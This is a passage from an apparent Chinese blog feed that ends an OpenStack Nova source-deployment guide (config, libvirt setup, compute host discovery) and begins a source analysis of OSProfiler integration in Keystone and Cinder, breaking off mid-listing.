--debug</span><br><span class="line">sudo nova-conductor --config-file=/etc/nova/nova.conf --debug</span><br><span class="line"><span class="comment"># sudo nova-novncproxy --config-file=/etc/nova/nova.conf --debug</span></span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出计算服务</span></span><br><span class="line">openstack compute service list</span><br><span class="line"></span><br><span class="line"><span class="comment"># API 状态</span></span><br><span class="line">nova-status upgrade check</span><br></pre></td></tr></table></figure><h1 id="计算节点"><a href="#计算节点" class="headerlink" title="计算节点"></a>计算节点</h1><p>PS：这里连 mysql 都装了，其实没必要。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/nova.git --branch stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">pip install bindep</span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line"></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"><span class="comment"># sudo apt-get install libpq-dev</span></span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment"># pip install -e .</span></span><br><span class="line">pip install tox</span><br><span class="line"><span class="comment"># git init</span></span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>编辑配置文件 /etc/nova/nova.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line">sudo mkdir /etc/nova</span><br><span class="line"><span class="comment">#sudo mkdir /var/lib/nova/tmp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝配置文件</span></span><br><span class="line">sudo cp etc/nova/nova.conf.sample /etc/nova/nova.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">sudo vim /etc/nova/nova.conf</span><br></pre></td></tr></table></figure><p>配置如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">transport_url</span> = rabbit://openstack:RABBIT_PASS@controller</span><br><span class="line"><span class="attr">my_ip</span> = <span class="number">10.0</span>.<span class="number">2.29</span></span><br><span class="line"><span class="attr">compute_driver</span>=libvirt.LibvirtDriver</span><br><span class="line"><span class="comment">#firewall_driver = nova.virt.firewall.NoopFirewallDriver</span></span><br><span class="line"></span><br><span class="line"><span class="section">[api]</span></span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">www_authenticate_uri</span> = http://controller:<span class="number">5000</span>/</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = nova</span><br><span class="line"><span class="attr">password</span> = nova</span><br><span class="line"><span class="comment">#memcached_servers = controller:11211</span></span><br><span class="line"></span><br><span class="line"><span class="section">[vnc]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">server_listen</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">server_proxyclient_address</span> = <span class="variable">$my_ip</span></span><br><span class="line"><span class="attr">novncproxy_base_url</span> = http://controller:<span class="number">6080</span>/vnc_auto.html</span><br><span class="line"></span><br><span class="line"><span class="section">[glance]</span></span><br><span class="line"><span class="attr">api_servers</span> = http://controller:<span class="number">9292</span></span><br><span class="line"></span><br><span class="line"><span class="section">[oslo_concurrency]</span></span><br><span class="line"><span class="attr">lock_path</span> = /var/lib/nova/tmp</span><br><span class="line"></span><br><span class="line"><span class="section">[placement]</span></span><br><span class="line"><span class="attr">region_name</span> = RegionOne</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">username</span> = placement</span><br><span class="line"><span class="attr">password</span> = placement</span><br><span class="line"></span><br><span class="line"><span class="section">[libvirt]</span></span><br><span class="line"><span class="attr">virt_type</span> = qemu</span><br></pre></td></tr></table></figure><p>计算主机本身不支持虚拟化，按照官方教程应该配置 <code>virt_type=qemu</code> ，但提示需要配置 <code>compute_driver</code> 查阅 <a href="https://docs.openstack.org//nova/latest/doc-nova.pdf">nova 文档</a>（p322）找到支持的虚拟化驱动</p><ul><li>libvirt.LibvirtDriver</li><li>ironic.IronicDriver</li><li>vmwareapi.VMwareVCDriver</li><li>hyperv.HyperVDriver</li><li>powervm.PowerVMDriver</li><li>zvm.ZVMDriver</li><li>fake.FakeDriver</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 libvirt</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-kvm libvirt-daemon-system -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询版本</span></span><br><span class="line">virsh</span><br><span class="line">version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用服务</span></span><br><span class="line">sudo nova-compute --config-file=/etc/nova/nova.conf --debug</span><br></pre></td></tr></table></figure><h2 id="控制节点-1"><a href="#控制节点-1" class="headerlink" title="控制节点"></a>控制节点</h2><p>添加到 cell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 身份认证</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认计算节点</span></span><br><span class="line">openstack compute service list --service nova-compute</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发现计算节点</span></span><br><span class="line"><span class="comment">#su -s /bin/sh -c &quot;nova-manage cell_v2 discover_hosts --verbose&quot; nova</span></span><br><span class="line">~/nova/.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 discover_hosts --verbose</span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出计算服务</span></span><br><span class="line">openstack compute service list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出镜像服务中的镜像，验证和镜像服务的连接</span></span><br><span class="line">openstack image list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 cells 和 placement API 是否成功运行</span></span><br><span class="line">nova-status upgrade check</span><br></pre></td></tr></table></figure><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://askubuntu.com/questions/984445/netplan-configuration-on-ubuntu-17-04-virtual-machine">netplan configuration on Ubuntu 17.04 virtual machine</a></li><li><a href="https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql">How To Allow Remote Access to MySQL</a></li></ul>]]></content>
    
    
    <summary type="html">记录部署流程</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>OSProfiler 源码分析</title>
    <link href="https://jckling.github.io/2021/05/25/OpenStack/OSProfiler%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://jckling.github.io/2021/05/25/OpenStack/OSProfiler%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2021-05-25T05:55:52.000Z</published>
    <updated>2021-11-23T14:04:58.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="支持-OSProfiler-的核心组件"><a href="#支持-OSProfiler-的核心组件" class="headerlink" title="支持 OSProfiler 的核心组件"></a>支持 OSProfiler 的核心组件</h1><p>OSProfiler 支持的组件的起始版本，6 个核心组件</p><table><thead><tr><th>组件</th><th>版本</th></tr></thead><tbody><tr><td>Keystone</td><td><a href="https://docs.openstack.org/releasenotes/keystone/newton.html">Newton</a></td></tr><tr><td>Glance</td><td><a href="https://docs.openstack.org/performance-docs/latest/test_plans/keystone/plan.html">Juno</a></td></tr><tr><td>Nova</td><td><a href="https://docs.openstack.org/releasenotes/nova/ocata.html">Ocata</a></td></tr><tr><td>Neutron</td><td><a href="https://docs.openstack.org/releasenotes/neutron/newton.html">Newton</a></td></tr><tr><td>Swift</td><td><a href="https://blueprints.launchpad.net/swift/+spec/osprofiler-support-in-swift">Blueprint Not started</a></td></tr><tr><td>Cinder</td><td><a href="https://docs.openstack.org/performance-docs/latest/test_plans/keystone/plan.html">Juno</a></td></tr></tbody></table><p>从 3.0.0 版本开始 OSProfiler 弃用 Python2 支持，至少得使用 Python3.6 。每个 OpenStack 都有对应的稳定版 OSProfiler ，主要用于性能测试。</p><img src="https://i.loli.net/2021/06/06/g34prsFtyhVnS5Y.png" width="60%"><h2 id="Keystone"><a href="#Keystone" class="headerlink" title="Keystone"></a>Keystone</h2><p>相关文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keystone/conf/__init__.py      <span class="comment"># 设置默认配置</span></span><br><span class="line">keystone/common/profiler.py    <span class="comment"># 读取配置文件，设置通知驱动，启用中间件</span></span><br><span class="line">keystone/common/sql/core.py    <span class="comment"># 包装数据库会话</span></span><br><span class="line">keystone/server/flask/core.py  <span class="comment"># 初始化，调用 common/profiler.py</span></span><br><span class="line">setup.cfg                      <span class="comment"># 设置中间件 WsgiMiddleware</span></span><br></pre></td></tr></table></figure><p><code>keystone/conf/__init__.py</code> 设置 OSProfiler 默认配置，不启用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_external_opts_defaults</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Update default configuration options for oslo.middleware.&quot;&quot;&quot;</span></span><br><span class="line">    cors.set_defaults(</span><br><span class="line">        allow_headers=[<span class="string">&#x27;X-Auth-Token&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Openstack-Request-Id&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Subject-Token&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Project-Id&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Project-Name&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Project-Domain-Id&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Project-Domain-Name&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Domain-Id&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Domain-Name&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;Openstack-Auth-Receipt&#x27;</span>],</span><br><span class="line">        expose_headers=[<span class="string">&#x27;X-Auth-Token&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;X-Openstack-Request-Id&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;X-Subject-Token&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;Openstack-Auth-Receipt&#x27;</span>],</span><br><span class="line">        allow_methods=[<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;PUT&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;DELETE&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;PATCH&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># configure OSprofiler options</span></span><br><span class="line">    profiler.set_defaults(CONF, enabled=<span class="literal">False</span>, trace_sqlalchemy=<span class="literal">False</span>)          <span class="comment"># 设置 OSProfiler 默认配置</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>keystone/common/profiler.py</code> 读取配置文件启用 OSProfiler ，设置驱动，添加日志信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>(<span class="params">name, host=<span class="string">&#x27;0.0.0.0&#x27;</span></span>):</span>  <span class="comment"># nosec</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Setup OSprofiler notifier and enable profiling.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param name: name of the service that will be profiled</span></span><br><span class="line"><span class="string">    :param host: hostname or host IP address that the service will be</span></span><br><span class="line"><span class="string">                 running on. By default host will be set to 0.0.0.0, but more</span></span><br><span class="line"><span class="string">                 specified host name / address usage is highly recommended.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler.initializer.init_from_conf(</span><br><span class="line">            conf=CONF,</span><br><span class="line">            context=&#123;&#125;,</span><br><span class="line">            project=<span class="string">&quot;keystone&quot;</span>,</span><br><span class="line">            service=name,</span><br><span class="line">            host=host</span><br><span class="line">        )</span><br><span class="line">        LOG.info(<span class="string">&quot;OSProfiler is enabled.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Traces provided from the profiler &quot;</span></span><br><span class="line">                 <span class="string">&quot;can only be subscribed to using the same HMAC keys that &quot;</span></span><br><span class="line">                 <span class="string">&quot;are configured in Keystone&#x27;s configuration file &quot;</span></span><br><span class="line">                 <span class="string">&quot;under the [profiler] section. \n To disable OSprofiler &quot;</span></span><br><span class="line">                 <span class="string">&quot;set in /etc/keystone/keystone.conf:\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;[profiler]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;enabled=false&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>setup.cfg</code> 设置 server 中间件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">keystone.server_middleware &#x3D;</span><br><span class="line">    cors &#x3D; oslo_middleware:CORS</span><br><span class="line">    sizelimit &#x3D; oslo_middleware:RequestBodySizeLimiter</span><br><span class="line">    http_proxy_to_wsgi &#x3D; oslo_middleware:HTTPProxyToWSGI</span><br><span class="line">    osprofiler &#x3D; osprofiler.web:WsgiMiddleware          &lt;--- 使用 osprofiler 的 WSGI 中间件</span><br><span class="line">    request_id &#x3D; oslo_middleware:RequestId</span><br><span class="line">    debug &#x3D; oslo_middleware:Debug</span><br></pre></td></tr></table></figure><p><code>keystone/server/flask/core.py</code> 服务器中间件按以下顺序处理请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># NOTE(morgan): ORDER HERE IS IMPORTANT! The middleware will process the</span></span><br><span class="line"><span class="comment"># request in this list&#x27;s order.</span></span><br><span class="line">_APP_MIDDLEWARE = (</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,</span><br><span class="line">                ep=<span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">                conf=&#123;<span class="string">&#x27;oslo_config_project&#x27;</span>: <span class="string">&#x27;keystone&#x27;</span>&#125;),</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,</span><br><span class="line">                ep=<span class="string">&#x27;sizelimit&#x27;</span>,</span><br><span class="line">                conf=&#123;&#125;),</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,</span><br><span class="line">                ep=<span class="string">&#x27;http_proxy_to_wsgi&#x27;</span>,</span><br><span class="line">                conf=&#123;&#125;),</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,     <span class="comment"># OSProfiler 提供的 WSGI 中间件</span></span><br><span class="line">                ep=<span class="string">&#x27;osprofiler&#x27;</span>,</span><br><span class="line">                conf=&#123;&#125;),</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,</span><br><span class="line">                ep=<span class="string">&#x27;request_id&#x27;</span>,</span><br><span class="line">                conf=&#123;&#125;),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>keystone/common/sql/core.py</code> 包装数据库引擎会话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 osprofiler 模块包装会话</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_wrap_session</span>(<span class="params">sess</span>):</span></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line">        sess = osprofiler.sqlalchemy.wrap_session(sql, sess)</span><br><span class="line">    <span class="keyword">return</span> sess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_for_read</span>():</span></span><br><span class="line">    <span class="keyword">if</span> _TESTING_USE_GLOBAL_CONTEXT_MANAGER:</span><br><span class="line">        reader = enginefacade.reader</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        reader = _get_main_context_manager().reader</span><br><span class="line">    <span class="keyword">return</span> _wrap_session(reader.using(_get_context()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_for_write</span>():</span></span><br><span class="line">    <span class="keyword">if</span> _TESTING_USE_GLOBAL_CONTEXT_MANAGER:</span><br><span class="line">        writer = enginefacade.writer</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        writer = _get_main_context_manager().writer</span><br><span class="line">    <span class="keyword">return</span> _wrap_session(writer.using(_get_context()))</span><br></pre></td></tr></table></figure><h2 id="Cinder"><a href="#Cinder" class="headerlink" title="Cinder"></a>Cinder</h2><p>相关文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cinder/db/sqlalchemy/api.py     <span class="comment"># 添加数据库追踪</span></span><br><span class="line">cinder/rpc.py                   <span class="comment"># 上下文序列化/反序列化</span></span><br><span class="line">cinder/service.py               <span class="comment"># 启用 OSProfiler；添加 RPC 追踪</span></span><br></pre></td></tr></table></figure><p><code>cinder/db/sqlalchemy/api.py</code> 添加数据库追踪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure</span>(<span class="params">conf</span>):</span></span><br><span class="line">    main_context_manager.configure(**<span class="built_in">dict</span>(conf.database))</span><br><span class="line">    <span class="comment"># NOTE(geguileo): To avoid a cyclical dependency we import the</span></span><br><span class="line">    <span class="comment"># group here.  Dependency cycle is objects.base requires db.api,</span></span><br><span class="line">    <span class="comment"># which requires db.sqlalchemy.api, which requires service which</span></span><br><span class="line">    <span class="comment"># requires objects.base</span></span><br><span class="line">    CONF.import_group(<span class="string">&quot;profiler&quot;</span>, <span class="string">&quot;cinder.service&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.trace_sqlalchemy:      <span class="comment"># 添加数据库追踪</span></span><br><span class="line">            <span class="keyword">lambda</span> eng: osprofiler_sqlalchemy.add_tracing(sqlalchemy,</span><br><span class="line">                                                          eng, <span class="string">&quot;db&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>cinder/rpc.py</code> 请求上下文类，对上下文进行序列化和反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RequestContextSerializer</span>(<span class="params">messaging.Serializer</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, base</span>):</span></span><br><span class="line">        self._base = base</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize_entity</span>(<span class="params">self, context, entity</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._base:</span><br><span class="line">            <span class="keyword">return</span> entity</span><br><span class="line">        <span class="keyword">return</span> self._base.serialize_entity(context, entity)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize_entity</span>(<span class="params">self, context, entity</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._base:</span><br><span class="line">            <span class="keyword">return</span> entity</span><br><span class="line">        <span class="keyword">return</span> self._base.deserialize_entity(context, entity)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        _context = context.to_dict()</span><br><span class="line">        <span class="keyword">if</span> profiler <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            prof = profiler.get()</span><br><span class="line">            <span class="keyword">if</span> prof:</span><br><span class="line">                trace_info = &#123;</span><br><span class="line">                    <span class="string">&quot;hmac_key&quot;</span>: prof.hmac_key,</span><br><span class="line">                    <span class="string">&quot;base_id&quot;</span>: prof.get_base_id(),</span><br><span class="line">                    <span class="string">&quot;parent_id&quot;</span>: prof.get_id()</span><br><span class="line">                &#125;</span><br><span class="line">                _context.update(&#123;<span class="string">&quot;trace_info&quot;</span>: trace_info&#125;)</span><br><span class="line">        <span class="keyword">return</span> _context</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        trace_info = context.pop(<span class="string">&quot;trace_info&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> trace_info:</span><br><span class="line">            <span class="keyword">if</span> profiler <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                profiler.init(**trace_info)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cinder.context.RequestContext.from_dict(context)</span><br></pre></td></tr></table></figure><p><code>cinder/service.py</code> 读取配置文件启用 OSProfiler ，设置驱动，添加日志信息；使用类装饰器追踪 RPC 调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 